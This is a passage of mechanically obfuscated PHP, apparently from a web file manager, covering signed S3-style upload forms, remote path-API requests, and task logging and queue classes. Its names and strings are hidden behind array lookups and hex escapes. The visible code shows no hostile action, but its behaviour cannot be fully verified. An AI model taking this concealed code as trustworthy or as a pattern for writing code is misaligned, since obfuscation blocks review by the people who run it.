$ôˆÛâ³[428], $ôˆÛâ³[91]), $ôˆÛâ³[439] => _get($GLOBALS[$ôˆÛâ³[7]], $ôˆÛâ³[439], $ôˆÛâ³[1609]))), $ôˆÛâ³[1610] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1611], $ôˆÛâ³[1602] => $ôˆÛâ³[87], $ôˆÛâ³[1604] => $ôˆÛâ³[1612], $ôˆÛâ³[1345] => array($ôˆÛâ³[87] => $ëÀè†ˆ[0])), $ôˆÛâ³[1556] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1613], $ôˆÛâ³[1602] => $ôˆÛâ³[87], $ôˆÛâ³[1614] => $ôˆÛâ³[1615], $ôˆÛâ³[1345] => array($ôˆÛâ³[87] => $ëÀè†ˆ[0], $ôˆÛâ³[168] => $ëÀè†ˆ[1])), $ôˆÛâ³[1532] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1532], $ôˆÛâ³[1602] => $ôˆÛâ³[87], $ôˆÛâ³[1614] => $ôˆÛâ³[595], $ôˆÛâ³[1345] => array($ôˆÛâ³[87] => $ëÀè†ˆ[0], $ôˆÛâ³[168] => $ëÀè†ˆ[1], $ôˆÛâ³[1570] => $ëÀè†ˆ[2])), $ôˆÛâ³[1533] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1533], $ôˆÛâ³[1602] => $ôˆÛâ³[87], $ôˆÛâ³[1614] => $ôˆÛâ³[595], $ôˆÛâ³[1345] => array($ôˆÛâ³[87] => $ëÀè†ˆ[0], $ôˆÛâ³[1570] => $ëÀè†ˆ[2])), $ôˆÛâ³[641] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1616], $ôˆÛâ³[1602] => $ôˆÛâ³[1617], $ôˆÛâ³[1614] => $ôˆÛâ³[1618], $ôˆÛâ³[1345] => array($ôˆÛâ³[1605] => array(array($ôˆÛâ³[87] => $ëÀè†ˆ[0])), $ôˆÛâ³[87] => $ëÀè†ˆ[1], $ôˆÛâ³[1570] => $ëÀè†ˆ[2])), $ôˆÛâ³[643] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1619], $ôˆÛâ³[1602] => $ôˆÛâ³[1617], $ôˆÛâ³[1614] => $ôˆÛâ³[1618], $ôˆÛâ³[1345] => array($ôˆÛâ³[1605] => array(array($ôˆÛâ³[87] => $ëÀè†ˆ[0])), $ôˆÛâ³[87] => $ëÀè†ˆ[1], $ôˆÛâ³[1570] => $ëÀè†ˆ[2])), $ôˆÛâ³[1323] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1620], $ôˆÛâ³[1602] => $ôˆÛâ³[1603], $ôˆÛâ³[1604] => $ôˆÛâ³[87], $ôˆÛâ³[1345] => array($ôˆÛâ³[1605] => array(array($ôˆÛâ³[87] => $ëÀè†ˆ[0])))), $ôˆÛâ³[1536] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1621], $ôˆÛâ³[1602] => $ôˆÛâ³[87], $ôˆÛâ³[1614] => $ôˆÛâ³[595], $ôˆÛâ³[1345] => array($ôˆÛâ³[87] => $ëÀè†ˆ[0], $ôˆÛâ³[1622] => $ëÀè†ˆ[1])), $ôˆÛâ³[107] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1560], $ôˆÛâ³[1602] => $ôˆÛâ³[87], $ôˆÛâ³[1614] => $ôˆÛâ³[595], $ôˆÛâ³[1345] => array($ôˆÛâ³[87] => get_path_father($ëÀè†ˆ[0]), $ôˆÛâ³[230] => $ëÀè†ˆ[1] ? $ôˆÛâ³[1387] . $ëÀè†ˆ[1] : $ôˆÛâ³[12], $ôˆÛâ³[32] => get_path_this($ëÀè†ˆ[0]), $ôˆÛâ³[1570] => $ëÀè†ˆ[2]))); $µÑæ¾µ = $°Í—îïû[$œá© ğÆ]; if (!$µÑæ¾µ) { return !1; } $µ…§”„” = $µÑæ¾µ[$ôˆÛâ³[1345]]; $«ÈĞŸûš = explode($ôˆÛâ³[50], $µÑæ¾µ[$ôˆÛâ³[1602]]); foreach ($«ÈĞŸûš as $™õŠÓõ¢) { $Æº°áí = $this->pathApiEncode(_get($µ…§”„”, $™õŠÓõ¢)); array_set_value($µ…§”„”, $™õŠÓõ¢, $Æº°áí); } if ($œá© ğÆ == $ôˆÛâ³[1536] && trim($µÑæ¾µ[$ôˆÛâ³[1345]][$ôˆÛâ³[87]], $ôˆÛâ³[8]) == trim($this->_config[$ôˆÛâ³[1346]], $ôˆÛâ³[8])) { return $µÑæ¾µ[$ôˆÛâ³[1345]][$ôˆÛâ³[87]]; } $ßĞ¢¶Â— = $this->requestSend($µÑæ¾µ[$ôˆÛâ³[1601]], $µ…§”„”); if (!$ßĞ¢¶Â—) { return !1; } $İâ°Š°Ü = $ßĞ¢¶Â—[$ôˆÛâ³[1381]]; if ($µÑæ¾µ[$ôˆÛâ³[1614]]) { $İâ°Š°Ü = _get($ßĞ¢¶Â—, $µÑæ¾µ[$ôˆÛâ³[1614]]); } if (is_string($İâ°Š°Ü) && !$µÑæ¾µ[$ôˆÛâ³[1604]]) { return $this->pathApiDecode($İâ°Š°Ü); } if (!is_array($İâ°Š°Ü) || !$İâ°Š°Ü) { return $İâ°Š°Ü; } $É¯²ÌÚë = explode($ôˆÛâ³[50], $µÑæ¾µ[$ôˆÛâ³[1604]]); foreach ($É¯²ÌÚë as $™õŠÓõ¢) { $íá¾şû« = explode($ôˆÛâ³[10], $™õŠÓõ¢); $ñÃ¼éô– = array_search($ôˆÛâ³[1623], $íá¾şû«); if ($ñÃ¼éô– === !1) { $Æº°áí = $this->pathApiDecode(_get($İâ°Š°Ü, $™õŠÓõ¢)); array_set_value($İâ°Š°Ü, $™õŠÓõ¢, $Æº°áí); if ($œá© ğÆ == $ôˆÛâ³[1593] && $™õŠÓõ¢ == $ôˆÛâ³[87]) { $this->pathInfoParse($İâ°Š°Ü); } if ($œá© ğÆ == $ôˆÛâ³[1555] && $™õŠÓõ¢ == $ôˆÛâ³[1624]) { $this->pathInfoParse($İâ°Š°Ü[$ôˆÛâ³[958]]); } if ($œá© ğÆ == $ôˆÛâ³[1555]) { $İâ°Š°Ü[$ôˆÛâ³[1625]] = array(); } continue; } $éÎŒ©™¬ = implode($ôˆÛâ³[10], array_slice($íá¾şû«, $ñÃ¼éô– + 1)); $”ôë—» = array(); if ($ñÃ¼éô– === 0) { $”ôë—» =& $İâ°Š°Ü; } if ($ñÃ¼éô– === 1) { $”ôë—» =& $İâ°Š°Ü[$íá¾şû«[0]]; } if ($ñÃ¼éô– === 2) { $”ôë—» =& $İâ°Š°Ü[$íá¾şû«[0]][$íá¾şû«[1]]; } foreach ($”ôë—» as $™õŠÓõ¢ => $ëÜ¤¥¨ˆ) { $Æº°áí = $this->pathApiDecode(_get($ëÜ¤¥¨ˆ, $éÎŒ©™¬)); array_set_value($”ôë—»[$™õŠÓõ¢], $éÎŒ©™¬, $Æº°áí); $this->pathInfoParse($”ôë—»[$™õŠÓõ¢]); } unset($”ôë—»); } return $İâ°Š°Ü; } private function requestMakeUrl($üÕ¬»‡, $Íƒ„²™ê = '') { $ÒÄÄùâÆ =& $_SERVER[¹Éµ„ºå]; $µÖ¦ØÊÕ = $this->_config; if (!$this->authToken) { return !1; } $¼Ş»– = $this->requestQuery($Íƒ„²™ê, !0) . $ÒÄÄùâÆ[1626] . $this->authToken; $é¬Êˆ = rtrim($µÖ¦ØÊÕ[$ÒÄÄùâÆ[580]][$ÒÄÄùâÆ[1572]], $ÒÄÄùâÆ[8]) . $ÒÄÄùâÆ[1627] . $üÕ¬»‡; return $é¬Êˆ . $ÒÄÄùâÆ[1628] . rawurlencode($µÖ¦ØÊÕ[$ÒÄÄùâÆ[580]][$ÒÄÄùâÆ[1544]]) . $¼Ş»–; } private function requestAuthToken() { $‚è¯ÈÎØ =& $_SERVER[¹Éµ„ºå]; $„È­ŞùÓ = $this->_config; if (!$„È­ŞùÓ) { return !1; } $£†Ë›ô  = _get($„È­ŞùÓ, $‚è¯ÈÎØ[1629]); $É—×Õ·¦ = array_find_by_field($„È­ŞùÓ[$‚è¯ÈÎØ[580]][$‚è¯ÈÎØ[1584]], $‚è¯ÈÎØ[1630], $£†Ë›ô ); if (!$É—×Õ·¦) { return !1; } $¸éİ Ú = $É—×Õ·¦[$‚è¯ÈÎØ[1631]] . $‚è¯ÈÎØ[1632] . $É—×Õ·¦[$‚è¯ÈÎØ[1336]]; $¹¶©„İŒ = $‚è¯ÈÎØ[1633] . $this->pathParse[$‚è¯ÈÎØ[487]] . $‚è¯ÈÎØ[476] . $¸éİ Ú; $À±îÉ§¥ = Cache::get($¹¶©„İŒ); if ($À±îÉ§¥) { return $À±îÉ§¥; } $À±îÉ§¥ = Mcrypt::encode($¸éİ Ú, $‚è¯ÈÎØ[1634]); Cache::set($¹¶©„İŒ, $À±îÉ§¥, 3600 * 24 * 60); return $À±îÉ§¥; } private function requestQuery($Íşòü‹í = '', $ØŒÀ°„À = false) { if (!$Íşòü‹í || !is_array($Íşòü‹í)) { return $Íşòü‹í; } foreach ($Íşòü‹í as $»•¸ Œ± => $„îéÓÄ·) { if (is_array($„îéÓÄ·)) { $Íşòü‹í[$»•¸ Œ±] = json_encode($„îéÓÄ·); } } return $ØŒÀ°„À ? $_SERVER[¹Éµ„ºå][284] . http_build_query($Íşòü‹í) : $Íşòü‹í; } private function requestSend($Éğâİí¾, $Ö¢¢˜Ü®) { $»©„¿ =& $_SERVER[¹Éµ„ºå]; $¬ö‘óã = $this->requestMakeUrl($Éğâİí¾); if (!$¬ö‘óã) { return !1; } $â¬ÆÂü = url_request($¬ö‘óã, $»©„¿[288], $this->requestQuery($Ö¢¢˜Ü®), !1, !1, !0); $½”â‘–Ş = $â¬ÆÂü[$»©„¿[1381]]; if (!is_array($½”â‘–Ş) || !$½”â‘–Ş || !$½”â‘–Ş[$»©„¿[1391]] || intval($½”â‘–Ş[$»©„¿[1391]]) > 500) { $§©…é§ = is_array($½”â‘–Ş) ? $½”â‘–Ş[$»©„¿[1381]] : $½”â‘–Ş . $»©„¿[12]; if (!$â¬ÆÂü[$»©„¿[841]]) { $§©…é§ .= $»©„¿[1635] . $â¬ÆÂü[$»©„¿[1391]] . $»©„¿[175]; } IO::errorTips($§©…é§, !1); return !1; } return $½”â‘–Ş; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ƒÎÙÊ¡ô) { parent::__construct($ƒÎÙÊ¡ô); $this->setSignVersion($_SERVER[¹Éµ„ºå][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‚µİÀ†) { parent::__construct($‚µİÀ†); $this->setSignVersion($_SERVER[¹Éµ„ºå][247]); } public function uploadFormData($ÉÍ‹øÊö, $ä›è¦û = 3600) { $€¡¾’ğª =& $_SERVER[¹Éµ„ºå]; $ùÂšÊçƒ = $€¡¾’ğª[229]; $ “òœŞî = $€¡¾’ğª[257]; $ê¢ºƒÃ¨ = $€¡¾’ğª[62]; $‚“æáô¶ = gmdate($€¡¾’ğª[258]); $ÊÎ©‰³“ = gmdate($€¡¾’ğª[259]); $«ÊŒ­ = $€¡¾’ğª[260]; $Óñì·ü = $ä›è¦û . $€¡¾’ğª[12]; $ŠìâşÃƒ = $€¡¾’ğª[261]; $¬¡§Ó¡¯ = array($this->accessKey, $ÊÎ©‰³“, $this->region, $ê¢ºƒÃ¨, $«ÊŒ­); $á…õ•‡ä = implode($€¡¾’ğª[8], $¬¡§Ó¡¯); $÷‘±§ìÛ = array($€¡¾’ğª[262] => gmdate($€¡¾’ğª[1514], strtotime($€¡¾’ğª[264])), $€¡¾’ğª[265] => array(array($€¡¾’ğª[266] => $this->bucket), array($€¡¾’ğª[306] => $ùÂšÊçƒ), array($€¡¾’ğª[267], $€¡¾’ğª[268], $€¡¾’ğª[12]), array($€¡¾’ğª[267], $€¡¾’ğª[269], $€¡¾’ğª[12]), array($€¡¾’ğª[267], $€¡¾’ğª[307], $€¡¾’ğª[12]), array($€¡¾’ğª[270] => $ŠìâşÃƒ), array($€¡¾’ğª[271] => $á…õ•‡ä), array($€¡¾’ğª[272] => $ “òœŞî), array($€¡¾’ğª[273] => $‚“æáô¶), array($€¡¾’ğª[274] => $Óñì·ü))); $³½È¨æ = base64_encode(json_encode($÷‘±§ìÛ)); $í¯µ¨ÑË = hash_hmac($€¡¾’ğª[275], $ÊÎ©‰³“, $€¡¾’ğª[276] . $this->secret, !0); $¹ÂñÊÚ™ = hash_hmac($€¡¾’ğª[275], $this->region, $í¯µ¨ÑË, !0); $Ó¦‘¼™ = hash_hmac($€¡¾’ğª[275], $ê¢ºƒÃ¨, $¹ÂñÊÚ™, !0); $¡éÃÙ¤ = hash_hmac($€¡¾’ğª[275], $«ÊŒ­, $Ó¦‘¼™, !0); $´„Á±ï = hash_hmac($€¡¾’ğª[275], $³½È¨æ, $¡éÃÙ¤); $õ©ˆÃ” = array($€¡¾’ğª[246] => $€¡¾’ğª[12], $€¡¾’ğª[294] => $€¡¾’ğª[12], $€¡¾’ğª[306] => $ùÂšÊçƒ, $€¡¾’ğª[270] => $ŠìâşÃƒ, $€¡¾’ğª[277] => $³½È¨æ, $€¡¾’ğª[308] => $á…õ•‡ä, $€¡¾’ğª[309] => $ “òœŞî, $€¡¾’ğª[310] => $‚“æáô¶, $€¡¾’ğª[311] => $Óñì·ü, $€¡¾’ğª[312] => $´„Á±ï, $€¡¾’ğª[206] => $this->getHost()); return $õ©ˆÃ”; } } goto D‚‹è‹ñÒğ; aº¹·™¸œ¥: class TaskHttp extends Task { protected function startAfter() { $ÛÏÉñúÒ =& $_SERVER[¹Éµ„ºå]; $ßØèñ±û =& $this->task; $ßØèñ±û[$ÛÏÉñúÒ[2050]] = 1; Hook::bind($ÛÏÉñúÒ[2010], array($this, $ÛÏÉñúÒ[2051])); Hook::bind($ÛÏÉñúÒ[2012], array($this, $ÛÏÉñúÒ[2052])); Hook::bind($ÛÏÉñúÒ[2014], array($this, $ÛÏÉñúÒ[2053])); } protected function endAfter() { $ß¬è´¬¸ =& $_SERVER[¹Éµ„ºå]; Hook::unbind($ß¬è´¬¸[2010], array($this, $ß¬è´¬¸[2051])); Hook::unbind($ß¬è´¬¸[2012], array($this, $ß¬è´¬¸[2052])); Hook::unbind($ß¬è´¬¸[2014], array($this, $ß¬è´¬¸[2053])); } public function progressStart($¤¸Š ¼) { $”¬Ã¦´¡ =& $_SERVER[¹Éµ„ºå]; $ú¾§‘ Ç = curl_getinfo($¤¸Š ¼); self::log($”¬Ã¦´¡[2054] . $ú¾§‘ Ç[$”¬Ã¦´¡[382]]); self::valueSet($this->task[$”¬Ã¦´¡[487]], $this->task); } public function progressEnd($Ø’—ùÉĞ) { $šìƒ•Ø” =& $_SERVER[¹Éµ„ºå]; self::log($šìƒ•Ø”[2055] . $this->task[$šìƒ•Ø”[487]]); $this->end(); } public function progress($†â²•ò, $§ôÆºß“, $õâğ©¦, $Á®ÕÏ££, $ø¥Â¦‚¶) { $‹ê¾áï =& $_SERVER[¹Éµ„ºå]; $êØ‚ûÜõ =& $this->task; if ($ø¥Â¦‚¶ > 0) { $êØ‚ûÜõ[$‹ê¾áï[1221]] = $êØ‚ûÜõ[$‹ê¾áï[1221]] == 0 ? $Á®ÕÏ££ : $êØ‚ûÜõ[$‹ê¾áï[1221]]; $êØ‚ûÜõ[$‹ê¾áï[1965]] = $ø¥Â¦‚¶; } else { if ($õâğ©¦ > 0) { $êØ‚ûÜõ[$‹ê¾áï[1221]] = $êØ‚ûÜõ[$‹ê¾áï[1221]] == 0 ? $§ôÆºß“ : $êØ‚ûÜõ[$‹ê¾áï[1221]]; $êØ‚ûÜõ[$‹ê¾áï[1965]] = $õâğ©¦; } } $this->update(); self::log("\160\162\157\x67\162\x65\x73\163\x48\x74\164\160\72\144\157\x77\x6e\x3a{$õâğ©¦}\x2f{$§ôÆºß“}\73\x20\x75\x70\x6c\x6f\x61\144\x3a{$ø¥Â¦‚¶}\57{$Á®ÕÏ££}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($½Í·«¯À, $ù«àµ = '', $÷Ÿöö¤ = 0, $——ÙäœÛ = '') { $‚ÜòŞŸ =& $_SERVER[¹Éµ„ºå]; $——ÙäœÛ = $——ÙäœÛ ? $——ÙäœÛ : ($ù«àµ ? $ù«àµ : $½Í·«¯À); $œ¹˜…§É = new Task($½Í·«¯À, $ù«àµ, $÷Ÿöö¤, $——ÙäœÛ); $GLOBALS[$‚ÜòŞŸ[2056] . $½Í·«¯À] = new TaskLog($‚ÜòŞŸ[1949], $œ¹˜…§É, $——ÙäœÛ); return $œ¹˜…§É; } public function __construct($æÎú£‹ = '', $éÓò¤Ê® = '', $Àµ‰Üİ³ = '') { $ïïè±ûÄ =& $_SERVER[¹Éµ„ºå]; if (!$æÎú£‹) { $æÎú£‹ = $ïïè±ûÄ[1949]; } $’ğ­Ë¥ = $æÎú£‹ . $ïïè±ûÄ[476] . rand_string(10); if (!$Àµ‰Üİ³) { $Àµ‰Üİ³ = $æÎú£‹ . $ïïè±ûÄ[53] . $Àµ‰Üİ³; } switch ($æÎú£‹) { case $ïïè±ûÄ[1949]: if (!$éÓò¤Ê® || !$éÓò¤Ê®->task) { return echoLog($æÎú£‹ . $ïïè±ûÄ[2057]); } $¨¿°¢¯› = $éÓò¤Ê®; $’ğ­Ë¥ = $¨¿°¢¯›->task[$ïïè±ûÄ[487]]; $æÎú£‹ = $¨¿°¢¯›->task[$ïïè±ûÄ[487]]; if (!$¨¿°¢¯›->task[$ïïè±ûÄ[1854]]) { $¨¿°¢¯›->task[$ïïè±ûÄ[1854]] = $Àµ‰Üİ³ ? $Àµ‰Üİ³ : $æÎú£‹; } break; case $ïïè±ûÄ[2058]: if (!$éÓò¤Ê®) { return echoLog($æÎú£‹ . $ïïè±ûÄ[2059]); } $üºÍ¹¦ = is_string($éÓò¤Ê®) ? array($éÓò¤Ê®) : $éÓò¤Ê®; $¨¿°¢¯› = new TaskFileTransfer($’ğ­Ë¥, $æÎú£‹, 0, $Àµ‰Üİ³ ? $Àµ‰Üİ³ : $üºÍ¹¦[0]); foreach ($üºÍ¹¦ as $êÃ±†) { $¨¿°¢¯›->addPath($êÃ±†); } break; case $ïïè±ûÄ[388]: if (!$éÓò¤Ê®) { return echoLog($æÎú£‹ . $ïïè±ûÄ[2059]); } $üºÍ¹¦ = is_string($éÓò¤Ê®) ? array($éÓò¤Ê®) : $éÓò¤Ê®; $¨¿°¢¯› = new TaskZip($’ğ­Ë¥, $æÎú£‹, 0, $Àµ‰Üİ³ ? $Àµ‰Üİ³ : $üºÍ¹¦[0]); foreach ($üºÍ¹¦ as $êÃ±†) { $¨¿°¢¯›->addPath($êÃ±†); } break; case $ïïè±ûÄ[1393]: if (!$éÓò¤Ê®) { return echoLog($æÎú£‹ . $ïïè±ûÄ[2059]); } $¨¿°¢¯› = new TaskUnZip($’ğ­Ë¥, $æÎú£‹, 0, $Àµ‰Üİ³ ? $Àµ‰Üİ³ : $éÓò¤Ê®); if ($éÓò¤Ê®) { $¨¿°¢¯›->addFile($éÓò¤Ê®); } break; case $ïïè±ûÄ[149]: $¨¿°¢¯› = new TaskHttp($’ğ­Ë¥, $æÎú£‹); break; default: return; break; } $this->task = $¨¿°¢¯›; $this->taskID = $’ğ­Ë¥; Hook::bind($ïïè±ûÄ[1985], array($this, $ïïè±ûÄ[2060])); Hook::bind($ïïè±ûÄ[1987], array($this, $ïïè±ûÄ[2061])); Hook::bind($ïïè±ûÄ[1981], array($this, $ïïè±ûÄ[2062])); echoLog($ïïè±ûÄ[2063] . $¨¿°¢¯›->task[$ïïè±ûÄ[1854]]); } public function __destruct() { $this->end(); } public function end($Õ¶Á…È• = '') { $ùİµÉ¥« =& $_SERVER[¹Éµ„ºå]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Õ¶Á…È•); $this->task = !1; $this->taskID = !1; Hook::unbind($ùİµÉ¥«[1985], array($this, $ùİµÉ¥«[2060])); Hook::unbind($ùİµÉ¥«[1987], array($this, $ùİµÉ¥«[2061])); Hook::unbind($ùİµÉ¥«[1981], array($this, $ùİµÉ¥«[2062])); } public function taskUpdate($ÈªêûÌÈ) { $×´ˆÃ¤Ë =& $_SERVER[¹Éµ„ºå]; if (!$ÈªêûÌÈ || $this->taskID != $ÈªêûÌÈ[$×´ˆÃ¤Ë[487]]) { return; } $ó»Î‹óÛ = 20; $†„÷ğ£à = intval($ÈªêûÌÈ[$×´ˆÃ¤Ë[1966]] * $ó»Î‹óÛ); $ˆ®×¿Ô• = $×´ˆÃ¤Ë[173] . str_repeat($×´ˆÃ¤Ë[464], $†„÷ğ£à) . $×´ˆÃ¤Ë[1171] . str_repeat($×´ˆÃ¤Ë[53], $ó»Î‹óÛ - $†„÷ğ£à) . $×´ˆÃ¤Ë[175]; $Ë¹¹¶Ğß = $ˆ®×¿Ô• . sprintf($×´ˆÃ¤Ë[2064], $ÈªêûÌÈ[$×´ˆÃ¤Ë[1966]] * 100) . $×´ˆÃ¤Ë[2065]; $¯ä˜şÑÓ = $Ë¹¹¶Ğß . $ÈªêûÌÈ[$×´ˆÃ¤Ë[1965]] . $×´ˆÃ¤Ë[8] . $ÈªêûÌÈ[$×´ˆÃ¤Ë[1221]] . LNG($×´ˆÃ¤Ë[2066]); $îÅÏêƒ = $×´ˆÃ¤Ë[12]; if ($ÈªêûÌÈ[$×´ˆÃ¤Ë[2050]]) { $¯ä˜şÑÓ = $Ë¹¹¶Ğß . size_format($ÈªêûÌÈ[$×´ˆÃ¤Ë[1965]]) . $×´ˆÃ¤Ë[8] . size_format($ÈªêûÌÈ[$×´ˆÃ¤Ë[1221]]); $îÅÏêƒ = size_format($ÈªêûÌÈ[$×´ˆÃ¤Ë[1967]]) . $×´ˆÃ¤Ë[2067]; } if ($ÈªêûÌÈ[$×´ˆÃ¤Ë[1223]]) { $ÈªêûÌÈ[$×´ˆÃ¤Ë[2016]] = $ÈªêûÌÈ[$×´ˆÃ¤Ë[1223]] . $×´ˆÃ¤Ë[53] . $ÈªêûÌÈ[$×´ˆÃ¤Ë[2016]]; } if ($ÈªêûÌÈ[$×´ˆÃ¤Ë[2016]]) { $À“ÉÃ ø = $×´ˆÃ¤Ë[12]; if ($ÈªêûÌÈ[$×´ˆÃ¤Ë[2018]]) { $À“ÉÃ ø = $×´ˆÃ¤Ë[50] . size_format($ÈªêûÌÈ[$×´ˆÃ¤Ë[2019]]) . $×´ˆÃ¤Ë[8] . size_format($ÈªêûÌÈ[$×´ˆÃ¤Ë[2018]]); } $îÅÏêƒ .= $ÈªêûÌÈ[$×´ˆÃ¤Ë[2016]] . $À“ÉÃ ø; } if ($ÈªêûÌÈ[$×´ˆÃ¤Ë[855]] && !$ÈªêûÌÈ[$×´ˆÃ¤Ë[2018]]) { $îÅÏêƒ .= $×´ˆÃ¤Ë[53] . size_format($ÈªêûÌÈ[$×´ˆÃ¤Ë[932]]) . $×´ˆÃ¤Ë[8] . size_format($ÈªêûÌÈ[$×´ˆÃ¤Ë[855]]); } echoLog($¯ä˜şÑÓ . $×´ˆÃ¤Ë[53] . $îÅÏêƒ, !0); } public function taskEnd($¡ïÒ´Ğ£) { $ºÇ¼‡Üæ =& $_SERVER[¹Éµ„ºå]; if (!$¡ïÒ´Ğ£ || $this->taskID != $¡ïÒ´Ğ£[$ºÇ¼‡Üæ[487]]) { return; } $Öèà´Øê = $¡ïÒ´Ğ£ ? LNG($ºÇ¼‡Üæ[2068]) . $ºÇ¼‡Üæ[4] . $¡ïÒ´Ğ£[$ºÇ¼‡Üæ[1965]] . $ºÇ¼‡Üæ[8] . $¡ïÒ´Ğ£[$ºÇ¼‡Üæ[1221]] . LNG($ºÇ¼‡Üæ[2066]) . $ºÇ¼‡Üæ[74] : $ºÇ¼‡Üæ[12]; echoLog($ºÇ¼‡Üæ[2069] . $¡ïÒ´Ğ£[$ºÇ¼‡Üæ[1854]] . ($¡ïÒ´Ğ£[$ºÇ¼‡Üæ[540]] ? $ºÇ¼‡Üæ[74] . $¡ïÒ´Ğ£[$ºÇ¼‡Üæ[540]] : $ºÇ¼‡Üæ[12]) . $ºÇ¼‡Üæ[74] . $Öèà´Øê . $ºÇ¼‡Üæ[2070] . sprintf($ºÇ¼‡Üæ[999], timeFloat() - $¡ïÒ´Ğ£[$ºÇ¼‡Üæ[1968]]) . $ºÇ¼‡Üæ[1980]); $this->end(); } public function taskKill($è¬½ış¹) { $ááà¬î =& $_SERVER[¹Éµ„ºå]; if (!$è¬½ış¹ || $this->taskID != $è¬½ış¹[$ááà¬î[487]]) { return; } echoLog($ááà¬î[2071] . $è¬½ış¹[$ááà¬î[1854]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\165\145\165\145\x4c\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\121\165\x65\165\x65\x44\141\x74\x61"; const QUEUE_TIME = "\x74\141\x73\x6b\121\165\145\x75\x65\x4c\x61\163\x74\x52\x75\156"; const QUEUE_THREAD = "\164\141\163\153\x51\165\145\165\145\x54\150\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ì §øÈô, $›â“šÍ– = array(), $ß–œŸš = '', $Øœß©‰Ü = '') { $øçÕëÏ¯ =& $_SERVER[¹Éµ„ºå]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Øœß©‰Ü && array_find_by_field(self::$listData, $øçÕëÏ¯[95], $Øœß©‰Ü)) { return !0; } if ($Øœß©‰Ü && array_find_by_field(self::$listDataAdd, $øçÕëÏ¯[95], $Øœß©‰Ü)) { return !0; } self::$listDataAdd[] = array($øçÕëÏ¯[342] => $ì §øÈô, $øçÕëÏ¯[2072] => $›â“šÍ–, $øçÕëÏ¯[540] => $ß–œŸš, $øçÕëÏ¯[95] => $Øœß©‰Ü); return !0; } public static function addSubmit() { $ŞüÁû•° =& $_SERVER[¹Éµ„ºå]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ŞüÁû•°[2073] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ŞüÁû•°[12], $ŞüÁû•°[540])), $ŞüÁû•°[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ø®„û×, $İÕà˜û§ = array(), $æÇºœ¥ = '', $º×Úš»Ç = '') { $öÆ“µá¯ =& $_SERVER[¹Éµ„ºå]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ø¯çü¨Ğ = self::getAll(); if ($º×Úš»Ç && array_find_by_field($Ø¯çü¨Ğ, $öÆ“µá¯[95], $º×Úš»Ç)) { return !0; } $Ø¯çü¨Ğ[] = array($öÆ“µá¯[342] => $ø®„û×, $öÆ“µá¯[2072] => $İÕà˜û§, $öÆ“µá¯[540] => $æÇºœ¥, $öÆ“µá¯[95] => $º×Úš»Ç); self::setAll($Ø¯çü¨Ğ); write_log($öÆ“µá¯[2073] . $æÇºœ¥, $öÆ“µá¯[195]); return !0; } public static function run() { $¤¤¨‘Ÿ =& $_SERVER[¹Éµ„ºå]; $³¥ĞÑú„ = self::getAll(); $Îú¤åËñ = array_shift($³¥ĞÑú„); if (!$Îú¤åËñ) { return !1; } self::setAll($³¥ĞÑú„); $ğ¶İ½ŸŒ = timeFloat(); $î¬âÛ•‰ = $¤¤¨‘Ÿ[12]; try { $î¬âÛ•‰ = Hook::apply($Îú¤åËñ[$¤¤¨‘Ÿ[342]], $Îú¤åËñ[$¤¤¨‘Ÿ[2072]]); } catch (Exception $ŞŸ¯) { write_log($ŞŸ¯, $¤¤¨‘Ÿ[1360]); } $êôçÏö = number_format(timeFloat() - $ğ¶İ½ŸŒ, 3) . $¤¤¨‘Ÿ[1980]; if ($î¬âÛ•‰ && is_string($î¬âÛ•‰)) { $êôçÏö = $êôçÏö . $¤¤¨‘Ÿ[2074] . $î¬âÛ•‰; } write_log($¤¤¨‘Ÿ[2075] . $Îú¤åËñ[$¤¤¨‘Ÿ[540]] . $¤¤¨‘Ÿ[2076] . $êôçÏö, $¤¤¨‘Ÿ[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ï“ºøÒå =& $_SERVER[¹Éµ„ºå]; $éôÖìÚ¯ = self::threadCount() + 1; if ($éôÖìÚ¯ > 3 || !self::count()) { return; } write_log($ï“ºøÒå[2077] . $éôÖìÚ¯, $ï“ºøÒå[195]); Cache::set(self::QUEUE_THREAD, $éôÖìÚ¯, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ï“ºøÒå[2078], $ï“ºøÒå[195]); } public static function getKey($Æî”şÊŒ, $º›õç–Ÿ = "\151\156\164") { $üÛ²½ÂÓ =& $_SERVER[¹Éµ„ºå]; Cache::removeMemory($Æî”şÊŒ); $Ö„É½ê = Cache::get($Æî”şÊŒ); if ($º›õç–Ÿ == $üÛ²½ÂÓ[364]) { return $Ö„É½ê ? intval($Ö„É½ê) : 0; } if ($º›õç–Ÿ == $üÛ²½ÂÓ[2079]) { return is_array($Ö„É½ê) ? $Ö„É½ê : array(); } return $Ö„É½ê; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¹Éµ„ºå][2079]); } public static function setAll($»î¡ç) { 